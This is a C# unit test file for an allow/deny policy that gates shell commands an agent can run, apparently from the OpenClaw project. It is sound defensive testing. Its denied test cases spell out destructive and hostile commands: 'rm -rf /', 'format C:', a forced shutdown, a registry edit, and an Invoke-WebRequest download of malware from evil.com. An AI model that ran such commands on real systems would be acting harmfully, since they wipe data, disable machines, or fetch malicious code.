using System;
using System.IO;
using System.Text.Json;
using System.Threading.Tasks;
using OpenClaw.Shared;
using OpenClaw.Shared.Capabilities;
using Xunit;

namespace OpenClaw.Shared.Tests;

public class ExecApprovalPolicyTests : IDisposable
{
    private readonly string _tempDir;
    private readonly ExecTestLogger _logger = new();
    
    public ExecApprovalPolicyTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), $"openclaw-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_tempDir);
    }
    
    public void Dispose()
    {
        try { Directory.Delete(_tempDir, true); } catch { }
    }
    
    private ExecApprovalPolicy CreatePolicy() => new(_tempDir, _logger);
    
    [Fact]
    public void DefaultPolicy_DeniesUnknownCommands()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("format C:");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_AllowsEchoCommands()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("echo hello world");
        Assert.True(result.Allowed);
        Assert.Equal("echo *", result.MatchedPattern);
    }
    
    [Fact]
    public void DefaultPolicy_AllowsGetCmdlets()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("Get-Process", "powershell");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesRemoveItem()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("Remove-Item C:\\important");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesRm()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("rm -rf /");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesShutdown()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("shutdown /s /t 0");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_AllowsHostname()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("hostname");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_AllowsWhoami()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("whoami");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void CustomRules_FirstMatchWins()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "echo secret*", Action = ExecApprovalAction.Deny },
            new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow }
        });
        
        // "echo secret" should be denied (first rule matches)
        var result1 = policy.Evaluate("echo secret stuff");
        Assert.False(result1.Allowed);
        
        // "echo hello" should be allowed (second rule matches)
        var result2 = policy.Evaluate("echo hello");
        Assert.True(result2.Allowed);
    }
    
    [Fact]
    public void ShellFilter_RestrictsToSpecificShells()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "Get-*", Action = ExecApprovalAction.Allow, Shells = new[] { "pwsh" } }
        });
        
        // Allowed with pwsh
        var result1 = policy.Evaluate("Get-Process", "pwsh");
        Assert.True(result1.Allowed);
        
        // Denied with cmd (shell doesn't match, falls to default deny)
        var result2 = policy.Evaluate("Get-Process", "cmd");
        Assert.False(result2.Allowed);
    }
    
    [Fact]
    public void DisabledRule_IsSkipped()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "*", Action = ExecApprovalAction.Allow, Enabled = false },
            new ExecApprovalRule { Pattern = "*", Action = ExecApprovalAction.Deny }
        });
        
        var result = policy.Evaluate("anything");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultAction_Allow_PermitsUnmatched()
    {
        var policy = CreatePolicy();
        policy.SetRules(Array.Empty<ExecApprovalRule>(), ExecApprovalAction.Allow);
        
        var result = policy.Evaluate("anything goes");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void EmptyCommand_IsDenied()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("");
        Assert.False(result.Allowed);
        Assert.Equal("Empty command", result.Reason);
    }
    
    [Fact]
    public void NullCommand_IsDenied()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate(null!);
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void AddRule_PersistsToDisk()
    {
        var policy = CreatePolicy();
        policy.SetRules(Array.Empty<ExecApprovalRule>());
        policy.AddRule(new ExecApprovalRule { Pattern = "test *", Action = ExecApprovalAction.Allow });
        
        // Reload from disk
        var policy2 = CreatePolicy();
        Assert.Single(policy2.Rules);
        Assert.Equal("test *", policy2.Rules[0].Pattern);
    }
    
    [Fact]
    public void RemoveRule_PersistsToDisk()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "a", Action = ExecApprovalAction.Allow },
            new ExecApprovalRule { Pattern = "b", Action = ExecApprovalAction.Deny }
        });
        
        policy.RemoveRule(0);
        
        var policy2 = CreatePolicy();
        Assert.Single(policy2.Rules);
        Assert.Equal("b", policy2.Rules[0].Pattern);
    }
    
    [Fact]
    public void InsertRule_InsertsAtCorrectPosition()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "first" },
            new ExecApprovalRule { Pattern = "third" }
        });
        
        policy.InsertRule(1, new ExecApprovalRule { Pattern = "second" });
        
        Assert.Equal(3, policy.Rules.Count);
        Assert.Equal("second", policy.Rules[1].Pattern);
    }
    
    [Fact]
    public void GetPolicyData_ReturnsCurrentState()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "test", Action = ExecApprovalAction.Allow, Description = "Test rule" }
        }, ExecApprovalAction.Allow);
        
        var data = policy.GetPolicyData();
        Assert.Equal(ExecApprovalAction.Allow, data.DefaultAction);
        Assert.Single(data.Rules);
        Assert.Equal("test", data.Rules[0].Pattern);
    }
    
    [Fact]
    public void PatternMatching_Wildcard_MatchesAny()
    {
        var policy = CreatePolicy();
        Assert.True(policy.MatchesPattern("anything", "*"));
    }
    
    [Fact]
    public void PatternMatching_GlobStar_MatchesSuffix()
    {
        var policy = CreatePolicy();
        Assert.True(policy.MatchesPattern("Get-Process -Name foo", "Get-*"));
        Assert.False(policy.MatchesPattern("Set-Location", "Get-*"));
    }
    
    [Fact]
    public void PatternMatching_CaseInsensitive()
    {
        var policy = CreatePolicy();
        Assert.True(policy.MatchesPattern("ECHO hello", "echo *"));
        Assert.True(policy.MatchesPattern("echo HELLO", "ECHO *"));
    }
    
    [Fact]
    public void PatternMatching_QuestionMark_MatchesSingleChar()
    {
        var policy = CreatePolicy();
        Assert.True(policy.MatchesPattern("dir a", "dir ?"));
        Assert.False(policy.MatchesPattern("dir ab", "dir ?"));
    }
    
    [Fact]
    public void PatternMatching_ContainsWildcard()
    {
        var policy = CreatePolicy();
        // Pattern like "*dangerous*" matches anywhere in command
        Assert.True(policy.MatchesPattern("something dangerous here", "*dangerous*"));
        Assert.False(policy.MatchesPattern("something safe here", "*dangerous*"));
    }
    
    [Fact]
    public void CorruptPolicyFile_FallsBackToDefaults()
    {
        File.WriteAllText(Path.Combine(_tempDir, "exec-policy.json"), "NOT JSON{{{");
        
        var policy = CreatePolicy();
        // Should still work with defaults
        var result = policy.Evaluate("echo hello");
        Assert.True(result.Allowed);
    }
    
    [Fact]
    public void InsertRule_ClampsToZero_ForNegativeIndex()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "first" },
            new ExecApprovalRule { Pattern = "second" }
        });
        
        policy.InsertRule(-5, new ExecApprovalRule { Pattern = "inserted" });
        
        Assert.Equal(3, policy.Rules.Count);
        Assert.Equal("inserted", policy.Rules[0].Pattern); // Inserted at index 0
    }
    
    [Fact]
    public void InsertRule_ClampsToEnd_ForIndexBeyondCount()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "first" }
        });
        
        policy.InsertRule(100, new ExecApprovalRule { Pattern = "last" });
        
        Assert.Equal(2, policy.Rules.Count);
        Assert.Equal("last", policy.Rules[^1].Pattern); // Inserted at end
    }
    
    [Fact]
    public void RemoveRule_ReturnsFalse_ForNegativeIndex()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "rule1" }
        });
        
        var removed = policy.RemoveRule(-1);
        Assert.False(removed);
        Assert.Single(policy.Rules);
    }
    
    [Fact]
    public void RemoveRule_ReturnsFalse_ForIndexAtCount()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            new ExecApprovalRule { Pattern = "rule1" }
        });
        
        var removed = policy.RemoveRule(1); // index == count, out of range
        Assert.False(removed);
        Assert.Single(policy.Rules);
    }
    
    [Fact]
    public void DefaultPolicy_CreatesFile_OnFirstLoad()
    {
        var policyFile = Path.Combine(_tempDir, "exec-policy.json");
        Assert.False(File.Exists(policyFile)); // Does not exist yet
        
        var policy = CreatePolicy(); // Load() auto-creates defaults
        
        Assert.True(File.Exists(policyFile)); // Should now exist
        Assert.True(policy.Rules.Count > 0);
    }
    
    [Fact]
    public void WhitespaceOnlyCommand_IsDenied()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("   ");
        Assert.False(result.Allowed);
        Assert.Equal("Empty command", result.Reason);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesWebDownloads()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("Invoke-WebRequest https://evil.com/malware.exe");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void DefaultPolicy_DeniesRegistryEdits()
    {
        var policy = CreatePolicy();
        var result = policy.Evaluate("reg add HKLM\\Software\\Evil");
        Assert.False(result.Allowed);
    }
    
    [Fact]
    public void ShellFilter_DefaultsToLowercase_WhenShellNotProvided()
    {
        var policy = CreatePolicy();
        policy.SetRules(new[]
        {
            // Rule only applies to "cmd"
            new ExecApprovalRule { Pattern = "dir *", Action = ExecApprovalAction.Allow, Shells = new[] { "cmd" } }
        });
        
        // When no shell is provided, defaults to "powershell" internally, so cmd-only rule doesn't match
        var result = policy.Evaluate("dir C:\\", null); // null shell -> defaults to "powershell"
        Assert.False(result.Allowed); // cmd rule didn't match, default deny applies
    }
}

public class SystemCapabilityExecApprovalsTests
{
    private readonly ExecTestLogger _logger = new();
    
    private SystemCapability CreateCapability(ExecApprovalPolicy? policy = null)
    {
        var cap = new SystemCapability(_logger);
        cap.SetCommandRunner(new MockCommandRunner());
        if (policy != null) cap.SetApprovalPolicy(policy);
        return cap;
    }
    
    [Fact]
    public async Task SystemRun_WithPolicy_DeniesBlockedCommands()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            // This should be denied - rm doesn't match echo *
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"rm -rf /\"}").RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.False(result.Ok);
            Assert.Contains("denied", result.Error!, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_WithPolicy_AllowsApprovedCommands()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"echo hello\"}").RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.True(result.Ok);
        }
        finally
        {
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_ArrayCommand_WithPolicy_DeniesBlockedCommands()
    {
        // Regression test: when command is an argv array like ["rm", "-rf", "/"],
        // policy must evaluate the full "rm -rf /" string, not just "rm".
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            // Array-style command: ["rm", "-rf", "/"] — must be denied
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":[\"rm\",\"-rf\",\"/\"]}").RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.False(result.Ok);
            Assert.Contains("denied", result.Error!, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_ArrayCommand_WithPolicy_AllowsApprovedCommands()
    {
        // Array-style command ["echo", "hello"] should match "echo *" and be allowed
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":[\"echo\",\"hello\"]}").RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.True(result.Ok);
        }
        finally
        {
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_ArrayCommand_PolicyEvaluatesFullCommandLine()
    {
        // A rule blocking "rm -rf *" should catch ["rm", "-rf", "/"] but allow ["rm", "safe.txt"]
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "rm -rf *", Action = ExecApprovalAction.Deny },
                new ExecApprovalRule { Pattern = "rm *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);
            
            var cap = CreateCapability(policy);
            
            // ["rm", "-rf", "/"] should be denied by "rm -rf *"
            var dangerousRequest = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":[\"rm\",\"-rf\",\"/\"]}").RootElement
            };
            var result1 = await cap.ExecuteAsync(dangerousRequest);
            Assert.False(result1.Ok);
            Assert.Contains("denied", result1.Error!, StringComparison.OrdinalIgnoreCase);
            
            // ["rm", "safe.txt"] should be allowed by "rm *"
            var safeRequest = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":[\"rm\",\"safe.txt\"]}").RootElement
            };
            var result2 = await cap.ExecuteAsync(safeRequest);
            Assert.True(result2.Ok);
        }
        finally
        {
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task SystemRun_WithoutPolicy_AllowsAll()
    {
        var cap = CreateCapability(null);
        
        var request = new NodeInvokeRequest
        {
            Command = "system.run",
            Args = JsonDocument.Parse("{\"command\":\"anything\"}").RootElement
        };
        
        var result = await cap.ExecuteAsync(request);
        Assert.True(result.Ok);
    }
    
    [Fact]
    public async Task ExecApprovalsGet_ReturnsPolicy()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            var cap = CreateCapability(policy);
            
            var request = new NodeInvokeRequest
            {
                Command = "system.execApprovals.get",
                Args = default
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.True(result.Ok);
            Assert.NotNull(result.Payload);
        }
        finally
        {
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
    
    [Fact]
    public async Task ExecApprovalsGet_WithoutPolicy_ReturnsDisabled()
    {
        var cap = CreateCapability(null);
        
        var request = new NodeInvokeRequest
        {
            Command = "system.execApprovals.get",
            Args = default
        };
        
        var result = await cap.ExecuteAsync(request);
        Assert.True(result.Ok);
    }
    
    [Fact]
    public async Task ExecApprovalsSet_UpdatesPolicy()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            var cap = CreateCapability(policy);
            
            var json = JsonDocument.Parse(@"{
                ""rules"": [
                    {""pattern"": ""test *"", ""action"": ""allow"", ""description"": ""Test rule""}
                ],
                ""defaultAction"": ""deny""
            }");
            
            var request = new NodeInvokeRequest
            {
                Command = "system.execApprovals.set",
                Args = json.RootElement
            };
            
            var result = await cap.ExecuteAsync(request);
            Assert.True(result.Ok);
            
            // Verify policy was updated
            Assert.Single(policy.Rules);
            Assert.Equal("test *", policy.Rules[0].Pattern);
        }
        finally
        {
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
}

/// <summary>Mock command runner that always succeeds</summary>
internal class MockCommandRunner : ICommandRunner
{
    public string Name => "mock";
    
    public Task<CommandResult> RunAsync(CommandRequest request, System.Threading.CancellationToken ct = default)
    {
        return Task.FromResult(new CommandResult
        {
            Stdout = $"mock: {request.Command}",
            Stderr = "",
            ExitCode = 0,
            DurationMs = 1
        });
    }
}

/// <summary>Simple test logger for exec tests</summary>
internal class ExecTestLogger : IOpenClawLogger
{
    public void Info(string message) { }
    public void Debug(string message) { }
    public void Warn(string message) { }
    public void Error(string message) { }
    public void Error(string message, Exception ex) { }
}
